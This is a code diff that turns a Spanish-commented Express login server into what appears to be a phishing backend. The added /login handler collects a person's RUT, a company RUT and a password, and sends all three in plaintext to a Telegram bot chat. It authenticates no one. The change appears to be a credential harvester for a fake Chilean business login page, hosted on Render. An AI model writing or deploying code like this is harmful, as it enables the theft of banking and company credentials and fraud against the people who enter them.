@@ -1,24 +1,37 @@
-const express = require('express');
-const bcrypt = require('bcrypt');
-const bodyParser = require('body-parser');
-
+const express = require("express");
+const fetch = require("node-fetch");
 const app = express();
-app.use(bodyParser.json());
 
-// Simulación de usuarios en BD
-const users = [
-  { user: 'pedro', passwordHash: bcrypt.hashSync('clave123', 10) }
-];
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
-app.post('/api/login', (req, res) => {
-  const { user, password } = req.body;
-  const found = users.find(u => u.user === user);
+// Variables de entorno en Render (Settings → Environment)
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 
-  if (found && bcrypt.compareSync(password, found.passwordHash)) {
-    res.json({ success: true, message: 'Login exitoso. Bienvenido.' });
-  } else {
-    res.json({ success: false, message: 'Usuario o clave incorrectos.' });
+async function sendTelegramMessage(text) {
+  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+  await fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: CHAT_ID, text })
+  });
+}
+
+app.post("/login", async (req, res) => {
+  const { rutPersona, rutEmpresa, passwd } = req.body;
+
+  // ⚠️ Notificación con los tres campos solicitados
+  const mensaje = `🔔 Nuevo intento de login:\n👤 RUT Persona: ${rutPersona}\n🏢 RUT Empresa: ${rutEmpresa}\n🔑 Contraseña: ${passwd}`;
+
+  try {
+    await sendTelegramMessage(mensaje);
+    res.send("✅ Notificación enviada a Telegram.");
+  } catch (error) {
+    console.error("Error enviando a Telegram:", error);
+    res.status(500).send("❌ Error al notificar.");
   }
 });
 
-app.listen(3000, () => console.log('Servidor corriendo en http://localhost:3000'));
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Servidor corriendo en http://localhost:${PORT}`));
